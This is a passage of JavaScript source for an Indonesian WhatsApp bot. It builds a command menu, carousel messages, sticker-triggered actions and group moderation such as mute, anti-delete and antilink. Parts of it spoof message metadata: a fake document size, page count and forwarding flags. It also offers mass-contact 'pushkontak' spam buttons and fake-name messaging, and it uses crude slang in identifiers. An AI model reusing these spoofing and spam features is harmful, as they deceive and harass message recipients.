                                    flow_action_payload: {
                                        screen: "QUESTION_ONE",
                                    },
                                    flow_metadata: {
                                        flow_json_version: 201,
                                        flow_name: "Lead Qualification [en]",
                                    },
                                }),
                            },
                            {
                                name: "submit_form",
                                buttonParamsJson: JSON.stringify({
                                    mode: "published",
                                    flow_message_version: "1",
                                    flow_cta: "Submit Form",
                                    flow_action: "submit",
                                    flow_action_payload: {
                                        form_data: {
                                            name: "Your Name",
                                            email: "your.email@example.com",
                                        },
                                    },
                                }),
                            },
                        ],
                    },
                },
            },
        };

        // Kirim pesan menggunakan `sych`
        await sych.sendMessage(m.key.remoteJid, message);
        console.log("Pesan interaktif berhasil dikirim!");
    } catch (error) {
        console.error("Gagal mengirim pesan interaktif:", error);
    }
}
						

//ppk

async function runPpkCase(m, sych, sycreply, isRegistered) {
  console.log("Debug - Memulai eksekusi runPpkCase");
// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
  try {
    // Pengecekan status pendaftaran
    if (!isRegistered) {
      console.log("Debug - Pengguna belum terdaftar.");
      return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
    }

    // Mengecek apakah file gambar ada
    const imagePath = './src/media/sychy.png';
    const fs = require('fs');
    if (!fs.existsSync(imagePath)) {
      console.error("Debug - File gambar tidak ditemukan di path:", imagePath);
      return sycreply('Gagal mengirim pesan karena file gambar tidak ditemukan.');
    } else {
      console.log("Debug - File gambar ditemukan:", imagePath);
    }

    // Membuat konten carousel
    const carouselCards = [
      {
        header: {
          title: "> Owner",
          hasMediaAttachment: true,
          imageMessage: (await generateWAMessageContent({
            image: {
              url: imagePath
            }
          }, {
            upload: sych.waUploadToServer
          })).imageMessage
        },
        body: {
          text: `> Hubungi Owner`
        },
        footer: {
          text: ""
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "Whatsapp",
                url: "https://wa.me/+17089003182"
              })
            },
            {
              name: "cta_call",
              buttonParamsJson: JSON.stringify({
                display_text: "Call",
                phone_number: "+6288274119688"
              })
            }
          ]
        }
      }
    ];

    console.log("Debug - Carousel cards dibuat:", carouselCards);

    // Membuat pesan carousel
    const carouselMessage = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: {
              text: "> Owner akan merespon secepat mungkin!!"
            },
            footer: {
              text: "©Langz"
            },
            header: {
              hasMediaAttachment: false
            },
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: carouselCards
            })
          })
        }
      }
    }, {});

    console.log("Debug - Carousel message telah dibuat:", carouselMessage);

    // Kirim pesan carousel
    await sych.relayMessage(m.chat, carouselMessage.message, {
      messageId: carouselMessage.key.id
    });
    console.log("Debug - Pesan carousel berhasil dikirim.");

  } catch (error) {
    console.error("Debug - Kesalahan saat mengirim carousel:", error);
    await sych.sendMessage(m.chat, {
      text: "Terjadi kesalahan saat mengirim pesan carousel. Silakan hubungi AI untuk memeriksa log kesalahan."
    }, {
      quoted: m
    });
  }
}

async function runAllMenuCase(m, sych, sycreply, isRegistered) {
  console.log("Debug - Memulai eksekusi runPpkCase");

 

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
				sycreply('Menampilkan All Menu...')
				let profile;
				try {
					profile = await sych.profilePictureUrl(m.sender, 'image');
				} catch (e) {
					profile = fake.anonim;
				}
				const menunya = `
■ 「 *${n}USER INFO${n}* 」
${f}*Nama* : ${m.pushName ? m.pushName : 'Tanpa Nama'}
${f}*Id* : @${m.sender.split('@')[0]}
${f}*User* : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
${f}*Limit* : ${isVip ? 'VIP' : db.users[m.sender].limit }
${f}*Uang* : ${db.users[m.sender] ? db.users[m.sender].uang.toLocaleString('id-ID') : '0'}

■ 「 *${n}BOT INFO${n}* 」
${f}*Nama Bot* : ${botname}
${f}*Powered* : @${'0@s.whatsapp.net'.split('@')[0]}
${f}*Owner* : @${owner[0].split('@')[0]}
${f}*Mode* : ${sych.public ? 'Public' : 'Self'}

■ 「 *${n}ABOUT${n}* 」
${f}*Tanggal* : ${tanggal}
${f}*Hari* : ${hari}
${f}*Jam* : ${jam} WIB
‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎
╭──❍「 *${n}BOT${n}* 」❍
│${setv} ${prefix}profile
│${setv} ${prefix}claim
│${setv} ${prefix}buy [item] (nominal)
│${setv} ${prefix}transfer
│${setv} ${prefix}leaderboard
│${setv} ${prefix}request (text)
│${setv} ${prefix}react (emoji)
│${setv} ${prefix}tagme
│${setv} ${prefix}runtime
│${setv} ${prefix}totalfitur
│${setv} ${prefix}ping
│${setv} ${prefix}afk
│${setv} ${prefix}rvo (reply pesan viewone)
│${setv} ${prefix}inspect (url gc)
│${setv} ${prefix}addmsg
│${setv} ${prefix}delmsg
│${setv} ${prefix}getmsg
│${setv} ${prefix}listmsg
│${setv} ${prefix}q (reply pesan)
│${setv} ${prefix}menfes (62xxx|fake name)
│${setv} ${prefix}donasi
╰─┬────❍
╭─┴❍「 *${n}GROUP${n}* 」❍
│${setv} ${prefix}add (62xxx)
│${setv} ${prefix}kick (@tag/62xxx)
│${setv} ${prefix}promote (@tag/62xxx)
│${setv} ${prefix}demote (@tag/62xxx)
│${setv} ${prefix}setname (nama baru gc)
│${setv} ${prefix}setdesc (desk)
│${setv} ${prefix}setppgc (reply imgnya)
│${setv} ${prefix}delete (reply pesan)
│${setv} ${prefix}linkgrup
│${setv} ${prefix}analyzechats
│${setv} ${prefix}revoke
│${setv} ${prefix}startsecret (@tag)
│${setv} ${prefix}secretmsg (q)
│${setv} ${prefix}endsecret
│${setv} ${prefix}tagall
│${setv} ${prefix}hidetag
│${setv} ${prefix}totag (reply pesan)
│${setv} ${prefix}listonline
│${setv} ${prefix}grup set
╰─┬────❍
╭─┴❍「 *${n}SEARCH${n}* 」❍
│${setv} ${prefix}spotify (query)
│${setv} ${prefix}ttstalk (query)
│${setv} ${prefix}ytsearch (query)
│${setv} ${prefix}ytsearch2 (q) | (q)
│${setv} ${prefix}pixiv (query)
│${setv} ${prefix}pinterest (query)
│${setv} ${prefix}wallpaper (query)
│${setv} ${prefix}ringtone (query)
│${setv} ${prefix}liriks (lirik/judul)
│${setv} ${prefix}google (query)
│${setv} ${prefix}gimage (query)
│${setv} ${prefix}npm (query)
│${setv} ${prefix}play3 (query)
│${setv} ${prefix}song (query)
│${setv} ${prefix}style (query)
│${setv} ${prefix}cuaca (kota)
│${setv} ${prefix}dukun (nama)
╰─┬────❍
╭─┴❍「 *${n}DOWNLOAD${n}* 」❍
│${setv} ${prefix}spotifydl (url)
│${setv} ${prefix}ytmp3 (url)
│${setv} ${prefix}ttslide (url)
│${setv} ${prefix}play3 (q)
│${setv} ${prefix}instagram (url)
│${setv} ${prefix}tiktok (url)
│${setv} ${prefix}facebook (url)
│${setv} ${prefix}mediafire (url)
│${setv} ${prefix}videymp4 (url)
╰─┬────❍
╭─┴❍「 *${n}QUOTES${n}* 」❍
│${setv} ${prefix}motivasi
│${setv} ${prefix}quotes
│${setv} ${prefix}dare
│${setv} ${prefix}truth
│${setv} ${prefix}renungan
╰─┬────❍
╭─┴❍「 *${n}ISLAMMIC${n}* 」❍
│${setv} ${prefix}quran <1-144>
│${setv} ${prefix}listsurah
│${setv} ${prefix}listdoa
│${setv} ${prefix}doa <1-37>
│${setv} ${prefix}bacaansholat
╰─┬────❍
╭─┴❍「 *${n}TOOLS${n}* 」❍
│${setv} ${prefix}get (url)
│${setv} ${prefix}link2img (url)
│${setv} ${prefix}encode (q)
│${setv} ${prefix}setcmd (reply stc)
│${setv} ${prefix}listcmd
│${setv} ${prefix}delcmd (reply stc)
│${setv} ${prefix}cekcuaca (kota)
│${setv} ${prefix}decode (q encode)
│${setv} ${prefix}hd (reply pesan)
│${setv} ${prefix}brat (txt)
│${setv} ${prefix}toaudio (reply pesan)
│${setv} ${prefix}tomp3 (reply pesan)
│${setv} ${prefix}tovn (reply pesan)
│${setv} ${prefix}toimage (reply pesan)
│${setv} ${prefix}toptv (reply pesan)
│${setv} ${prefix}tourl (reply pesan)
│${setv} ${prefix}getq (reply pesan)
│${setv} ${prefix}tts (textnya)
│${setv} ${prefix}toqr (textnya)
│${setv} ${prefix}ssweb (url)
│${setv} ${prefix}sticker (send/reply img)
│${setv} ${prefix}colong (reply stiker)
│${setv} ${prefix}smeme (send/reply img)
│${setv} ${prefix}emojimix 🙃+💀
│${setv} ${prefix}nulis
│${setv} ${prefix}joko (teksnya)
│${setv} ${prefix}readmore text1|text2
│${setv} ${prefix}qc (pesannya)
│${setv} ${prefix}translate
│${setv} ${prefix}wasted (send/reply img)
│${setv} ${prefix}triggered (send/reply img)
│${setv} ${prefix}shorturl (urlnya)
│${setv} ${prefix}gitclone (urlnya)
│${setv} ${prefix}fat (reply audio)
│${setv} ${prefix}fast (reply audio)
│${setv} ${prefix}bass (reply audio)
│${setv} ${prefix}slow (reply audio)
│${setv} ${prefix}tupai (reply audio)
│${setv} ${prefix}deep (reply audio)
│${setv} ${prefix}robot (reply audio)
│${setv} ${prefix}blown (reply audio)
│${setv} ${prefix}reverse (reply audio)
│${setv} ${prefix}smooth (reply audio)
│${setv} ${prefix}earrape (reply audio)
│${setv} ${prefix}nightcore (reply audio)
│${setv} ${prefix}getexif (reply sticker)
│${setv} ${prefix}sticktele
╰─┬────❍
╭─┴❍「 *${n}AI${n}* 」❍
│${setv} ${prefix}ai (query)
│${setv} ${prefix}gemini (query)
│${setv} ${prefix}luminai (query)
│${setv} ${prefix}meta (query)
│${setv} ${prefix}llama (query)
│${setv} ${prefix}setpromt2 (query)
│${setv} ${prefix}setpromt (query)
│${setv} ${prefix}simi (query)
│${setv} ${prefix}aitukam
│${setv} ${prefix}esia
│${setv} ${prefix}autoai2 (own)
│${setv} ${prefix}autoai (own)
│${setv} ${prefix}txt2img (query)
│${setv} ${prefix}img2text (reply img/stc)
│${setv} ${prefix}aimg (query)
╰─┬────❍
╭─┴❍「 *${n}CEWE${n}* 」❍
│${setv} ${prefix}cjpn 
│${setv} ${prefix}ckorea
│${setv} ${prefix}cthai
│${setv} ${prefix}cindo
│${setv} ${prefix}cviet
│${setv} ${prefix}cchina
╰─┬────❍
╭─┴❍「 *${n}ANIME${n}* 」❍
│${setv} ${prefix}waifu
│${setv} ${prefix}neko
│${setv} ${prefix}bluearchive
╰─┬────❍
╭─┴❍「 *${n}GAME${n}* 」❍
│${setv} ${prefix}tictactoe
│${setv} ${prefix}akinator
│${setv} ${prefix}suit
│${setv} ${prefix}slot
│${setv} ${prefix}math (level)
│${setv} ${prefix}begal
│${setv} ${prefix}casino (nominal)
│${setv} ${prefix}rampok (@tag)
│${setv} ${prefix}tekateki
│${setv} ${prefix}tebaklirik
│${setv} ${prefix}tebakkata
│${setv} ${prefix}tebakbom
│${setv} ${prefix}susunkata
│${setv} ${prefix}tebakkimia
│${setv} ${prefix}caklontong
│${setv} ${prefix}tebaknegara
│${setv} ${prefix}tebakgambar
│${setv} ${prefix}tebakepep
│${setv} ${prefix}tebakbendera
╰─┬────❍
╭─┴❍「 *${n}FUN${n}* 」❍
│${setv} ${prefix}dadu
│${setv} ${prefix}reminder
│${setv} ${prefix}cermin (q)
│${setv} ${prefix}bisakah (text)
│${setv} ${prefix}apakah (text)
│${setv} ${prefix}kapan (text)
│${setv} ${prefix}kerangajaib (text)
│${setv} ${prefix}cekmati (nama lu)
│${setv} ${prefix}ceksifat
│${setv} ${prefix}cekkhodam (nama lu)
│${setv} ${prefix}rate (reply pesan)
│${setv} ${prefix}jodohku
│${setv} ${prefix}jadian
│${setv} ${prefix}fitnah
│${setv} ${prefix}halah (text)
│${setv} ${prefix}hilih (text)
│${setv} ${prefix}huluh (text)
│${setv} ${prefix}heleh (text)
│${setv} ${prefix}holoh (text)
╰─┬────❍
╭─┴❍「 *${n}RANDOM${n}* 」❍
│${setv} ${prefix}coffe
│${setv} ${prefix}kucing
╰─┬────❍
╭─┴❍「 *${n}OWNER${n}* 」❍
│${setv} ${prefix}bot [set]
│${setv} ${prefix}addthumb <nme|lnk>
│${setv} ${prefix}delthumb <nme>
│${setv} ${prefix}listthumb
│${setv} ${prefix}setexif
│${setv} ${prefix}setbio
│${setv} ${prefix}setppbot
│${setv} ${prefix}join
│${setv} ${prefix}typodetect on/off
│${setv} ${prefix}leave
│${setv} ${prefix}block
│${setv} ${prefix}setmenu s<1-9>
│${setv} ${prefix}listblock
│${setv} ${prefix}openblock
│${setv} ${prefix}listpc
│${setv} ${prefix}addcase
│${setv} ${prefix}getcase
│${setv} ${prefix}delcase
│${setv} ${prefix}listgc
│${setv} ${prefix}checklocation
│${setv} ${prefix}creategc
│${setv} ${prefix}addprem
│${setv} ${prefix}delprem
│${setv} ${prefix}listprem
│${setv} ${prefix}addlimit
│${setv} ${prefix}adduang
│${setv} ${prefix}bot --settings
│${setv} ${prefix}bot settings
│${setv} ${prefix}getsession
│${setv} ${prefix}delsession
│${setv} ${prefix}delsampah
│${setv} ${prefix}upsw
│${setv} ${prefix}shutdown
│${setv} ${prefix}restart
│${setv} $
│${setv} >
│${setv} <
╰──────❍`;
				await sych.sendMessage(m.chat, {
    document: fake.docs,
    fileName: ucapanWaktu,
    mimetype: pickRandom(fake.listfakedocs),
    fileLength: '100000000000000',
    pageCount: '999',
    caption: menunya,
    buttons: [{
        buttonId: `${prefix}pushkontak2`,
        buttonText: {
            displayText: "PushKontak2"
        }
    }, {
        buttonId: `${prefix}list`,
        buttonText: {
            displayText: "List GC"
        }
    },{
    buttonId: `${prefix}pler`,
        buttonText: {
            displayText: "PushKontak2"
        }
    }, {
        buttonId: `${prefix}pepek`,
        buttonText: {
            displayText: "List GC"
        }
    }
    
    ],
    viewOnce: true,
    contextInfo: {
        mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
        forwardingScore: 10,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: my.ch,
            serverMessageId: null,
            newsletterName: `${botname}${randomEmoji}`
        },
        externalAdReply: {
            title: author,
            body: packname,
            showAdAttribution: true,
            thumbnailUrl: profile,
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: true,
            mediaUrl: my.gh,
            sourceUrl: my.gh,
        }
    }
}, {
    quoted: fkontak
});

// Mengirim stiker
await sych.sendMessage(m.chat, {
    sticker: {
        url: 'src/media/stc.webp'
    }, // Path file stiker
    mimetype: 'image/webp',
}, {
    quoted: floc
});

sych.sendMessage(m.chat, {
    react: {
        text: randomEmoji, // Emoji acak
        key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
    }
});
			}





// Debug untuk memeriksa apakah m.message ada
// Bagian kode lain di bawah

		/*
		
		[ ! ] INI KALO CUMA 1 LINK (NOT RANDOM)
		const sycreply = (teks) => {
			sych.sendMessage(m.chat, {
				text: teks,
				contextInfo: {
					externalAdReply: {
						"showAdAttribution": true,
						"containsAutoReply": true,
						"title": `${global.botname}`,
						"body": `${ucapanWaktu} ${m.pushName ? m.pushName : 'Tanpa Nama'} 👋🏻`,
						"previewType": "VIDEO",
						"thumbnailUrl": 'https://i.ibb.co.com/3rqCPX6/fk.jpg',
						"sourceUrl": 'https://github.com/sychyy'
					}
				}
			}, {
				quoted: fkontak
			})
		}
		
	*/
	
	
	
		
		// Daftar thumbnail URL yang bisa dipilih secara random
// Lokasi file JSON di folder 'database'
const thumbListFilePath = path.join(__dirname, 'database', 'thumbList.json');

// Fungsi untuk membaca data thumbnail dari file JSON
const readThumbList = () => {
    if (!fs.existsSync(thumbListFilePath)) {
        // Jika file tidak ada, buat file baru dengan array kosong
        fs.writeFileSync(thumbListFilePath, JSON.stringify([]));
        return [];
    }
    const data = fs.readFileSync(thumbListFilePath, 'utf-8');
    return JSON.parse(data);
};

// Fungsi untuk menulis data thumbnail ke file JSON
const writeThumbList = (thumbList) => {
    fs.writeFileSync(thumbListFilePath, JSON.stringify(thumbList, null, 2));
};

// Fungsi untuk menambahkan thumbnail
const addthumb = (nama, url) => {
    const thumbList = readThumbList();
    // Cek apakah nama sudah ada
    if (thumbList.find(thumb => thumb.name === nama)) {
        return 'Thumbnail dengan nama tersebut sudah ada.';
    }
    // Menambahkan thumbnail ke dalam daftar
    thumbList.push({ name: nama, url: url });
    writeThumbList(thumbList);
    return `Thumbnail dengan nama ${nama} berhasil ditambahkan.`;
};

// Fungsi untuk menghapus thumbnail berdasarkan nama
const delthumb = (nama) => {
    const thumbList = readThumbList();
    const index = thumbList.findIndex(thumb => thumb.name === nama);
    if (index === -1) {
        return 'Thumbnail dengan nama tersebut tidak ditemukan.';
    }
    thumbList.splice(index, 1);
    writeThumbList(thumbList);
    return `Thumbnail dengan nama ${nama} berhasil dihapus.`;
};

// Fungsi untuk menampilkan daftar thumbnail
const listthumb = () => {
    const thumbList = readThumbList();
    if (thumbList.length === 0) {
        return 'Tidak ada thumbnail yang tersimpan.';
    }
    return thumbList.map(thumb => `Nama: ${thumb.name}, URL: ${thumb.url}`).join('\n');
};

// Fungsi untuk memilih thumbnail secara random dari daftar
const getRandomThumb = () => {
    const thumbList = readThumbList();
    return thumbList[Math.floor(Math.random() * thumbList.length)]?.url || 'https://i.ibb.co.com/x6cRFN1/6cbaad220c211d8399577906a2f30856.jpg';
};

// Fungsi sycreply yang diperbarui
const sycreply = (teks) => {
    sych.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
        mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
            externalAdReply: {
                "showAdAttribution": true,
                "containsAutoReply": true,
                "title": `${global.botname}`,
                "body": `${ucapanWaktu} ${m.pushName ? m.pushName : 'Tanpa Nama'} 👋🏻`,
                "previewType": "VIDEO",
                "thumbnailUrl": getRandomThumb(), // Mengambil thumbnail secara random
                "sourceUrl": "",
            }
        }
    }, {
        quoted: fkontak
    })
}




//memanggil stiker

if (m.message && m.message.stickerMessage) {
  console.log("Debug - Stiker ditemukan!");
  const stickerID = Buffer.from(m.message.stickerMessage.fileSha256).toString('base64');
  console.log("Debug - ID Stiker yang diterima (base64):", stickerID);

  const stickerActions = {
  'hWIXHD4bWzU/JeaYEr2UbIqNaGIcwy419r3eLazCIuM=': 'ppk', // Stiker untuk case 'ppk'
  '1C5XPk0DAkGYH0X4gyxaMTHafPuNSzjULJXYJmrqzJ4=': 'allmenu', // Stiker untuk case 'allmenu'
  'Rp3XTwX5IBVAQ+6HJ49OW7ht3jm8Qu8S+4Ekg8NXBHc=': 'simi_kontol', // Stiker untuk query 'simi halo'
  'dev7xSIA6XNWeDB6bNNMcjJiq9nIvKGRXJCpbf7n1Xw=': 'simi_memek', // Stiker untuk query 'simi apa kabar'
  'h7J6okcUkiZc0UcgvgWAsWwyyuSiiP5aOkeb8k0GOzM=': 'kontol',
};

  if (stickerActions[stickerID]) {
    const action = stickerActions[stickerID];
    console.log("Debug - Aksi yang ditemukan untuk stiker:", action);

    switch (action) {
  case 'ppk':
    console.log("Debug - Memanggil case 'ppk'");
    await runPpkCase(m, sych, sycreply, isRegistered);
    break;

  case 'allmenu':
    console.log("Debug - Memanggil case 'allmenu'");
    await runAllMenuCase(m, sych, sycreply, isRegistered);
    break;

  case 'simi_kontol':
    console.log("Debug - Memanggil case 'simi_kontol'");
    const hasilHalo = await simi('simi kontol'); // Kirim query "simi halo" ke API Simi
    sycreply(hasilHalo.success); // Kirim balasan Simi ke pengguna
    break;

  case 'simi_memek':
    console.log("Debug - Memanggil case 'simi_memek'");
    const hasilApaKabar = await simi('simi memek'); // Kirim query "simi apa kabar" ke API Simi
    sycreply(hasilApaKabar.success); // Kirim balasan Simi ke pengguna
    break;

case 'kontol':
    console.log("Debug - Memanggil case 'kontol'");
    await runKontolCase(m, sych, sycreply, isRegistered);
    break;

  default:
    console.log("Debug - Tidak ada aksi untuk stiker ini.");
    sycreply('Tidak ada aksi untuk stiker ini.');
}
  } else {
    console.log("Debug - Stiker tidak terdaftar dalam stickerActions.");
  }
} else {
  console.log("Debug - Tidak ada pesan stiker dalam pesan yang diterima.");
}



// 3. Modifikasi pengolahan command
if (isCmd && m.sender !== botNumber && !m.isGroup) {
    if (typoDetectionEnabled) { // Periksa apakah fitur aktif
        let typoCorrection = detectTypoCommand(command);
        if (typoCorrection && typoCorrection !== command) {
            return sycreply(`Mungkin yang Anda maksud adalah: *${prefix}${typoCorrection}*`);
        }
    }
}
// Fungsi untuk mengubah gambar menjadi Base64
function imgToBase64(filePath) {
    try {
        const fileData = fs.readFileSync(filePath); // Membaca file gambar
        return fileData.toString('base64'); // Mengonversi ke format Base64
    } catch (err) {
        console.error("Error membaca file:", err);
    }
}
// Fungsi untuk mengubah Base64 menjadi gambar
function base64ToImg(base64String, outputPath) {
    try {
        const buffer = Buffer.from(base64String, 'base64'); // Mengubah Base64 ke buffer
        // Pastikan direktori output ada
        const dirPath = path.dirname(outputPath);
        if (!fs.existsSync(dirPath)) {
            fs.mkdirSync(dirPath, { recursive: true });
        }
        fs.writeFileSync(outputPath, buffer); // Menyimpan buffer sebagai file gambar
        console.log("File berhasil disimpan:", outputPath);
    } catch (err) {
        console.error("Error menulis file:", err);
    }
}




		// Reset Limit
		cron.schedule('00 00 * * *', () => {
			let user = Object.keys(db.users)
			for (let jid of user) {
				const limitUser = db.users[jid].vip ? limit.vip : prem.checkPremiumUser(jid, premium) ? limit.premium : limit.free
				db.users[jid].limit = limitUser
				console.log('Reseted Limit')
			}
		}, {
			scheduled: true,
			timezone: 'Asia/Jakarta'
		})
		// Auto Set Bio
		if (db.set[botNumber].autobio) {
			let setbio = db.set[botNumber]
			if (new Date() * 1 - setbio.status > 60000) {
				await sych.updateProfileStatus(`${sych.user.name} | 🎯 Runtime : ${runtime(os.uptime())}`)
				setbio.status = new Date() * 1
			}
		}
		// Set Public
		if (!sych.public) {
			console.log("Bot dalam mode self");
			if (!isCreator && !m.key.fromMe) {
				console.log("Pesan ditolak: bukan kreator atau pemilik bot");
				return;
			}
		}
		// Auto Read
		if (m.message && m.key.remoteJid !== 'status@broadcast') {
			console.log(chalk.black(chalk.bgWhite('[ PESAN ]:'), chalk.bgGreen(new Date), chalk.bgHex('#00EAD3')(budy || m.type) + '\n' + chalk.bgCyanBright('[ DARI ] :'), chalk.bgYellow(m.pushName || (isCreator ? 'Bot' : 'Anonim')), chalk.bgHex('#FF449F')(m.sender), chalk.bgHex('#FF5700')(m.isGroup ? m.metadata.subject : m.chat.endsWith('@newsletter') ? 'Newsletter' : 'Private Chat'), chalk.bgBlue('(' + m.chat + ')')));
			if (db.set[botNumber].autoread && sych.public) sych.readMessages([m.key]);
		}
		// Group Settings
		if (m.isGroup) {
			// Mute
	// Logika mute yang diperbarui
if (db.groups[m.chat].mute && !isCreator) {
    console.log(`[MUTE] Grup: ${m.chat} dalam mode mute.`);

    // Periksa apakah pengirim adalah admin
    const groupMetadata = m.isGroup ? await sych.groupMetadata(m.chat) : null; // Metadata grup
    const participants = groupMetadata ? groupMetadata.participants : []; // Daftar peserta grup
    const isAdmins = m.isGroup ? participants.some(v => v.id === m.sender && v.admin) : false; // Apakah pengirim admin?

    console.log(`[MUTE] Apakah pengirim admin? ${isAdmins}`);
    console.log(`[MUTE] Apakah pengirim adalah creator? ${isCreator}`);

    // Jika pengirim adalah admin atau creator, abaikan mode mute
    if (isAdmins || isCreator) {
        console.log(`[MUTE] Pengirim diperbolehkan berbicara meskipun dalam mode mute.`);
        return;
    }

    // Jika pengirim bukan admin atau creator, hentikan proses
    console.log(`[MUTE] Pesan dari ${m.sender} diabaikan.`);
    return;
}
			// Anti Delete
			if (m.type == 'protocolMessage' && db.groups[m.chat].antidelete && !isCreator && m.isBotAdmin && !m.isAdmin) {
				const mess = chatUpdate.messages[0].message.protocolMessage
				if (store.messages && store.messages[m.chat] && store.messages[m.chat].array) {
					const chats = store.messages[m.chat].array.find(a => a.id === mess.key.id);
					chats.msg.contextInfo = {
						mentionedJid: [chats.key.participant],
						isForwarded: true,
						forwardingScore: 1,
						quotedMessage: {
							conversation: '*Anti Delete❗*'
						},
						...chats.key
					}
					const pesan = chats.type === 'conversation' ? {
						extendedTextMessage: {
							text: chats.msg,
							contextInfo: {
								mentionedJid: [chats.key.participant],
								isForwarded: true,
								forwardingScore: 1,
								quotedMessage: {
							    conversation: '*Anti Delete❗*'
								},
								...chats.key
								
								
							}
						}
					} : {
						[chats.type]: chats.msg
					}
					await sych.relayMessage(m.chat, pesan, {})
				}
			}
			// Anti Link Group
	// Menangani pesan masuk
if (db.groups[m.chat].antilink && !isCreator && m.isBotAdmin && !m.isAdmin) {
    try {
        console.log('Antilink aktif, pengirim bukan creator atau admin, dan bot adalah admin.');

        // Log pesan yang diterima
        console.log('Pesan yang diterima:', m.text);

        // Cek apakah pesan mengandung tautan WhatsApp grup
        if (m.text.match(/chat\.whatsapp\.com/)) {
            console.log('Pesan mengandung tautan grup WhatsApp.');

            // Dapatkan kode undangan grup
            const groupInviteCode = await sych.groupInviteCode(m.chat);
            console.log('Kode undangan grup saat ini:', groupInviteCode);

            // Cek apakah tautan yang diterima adalah tautan grup yang sesuai
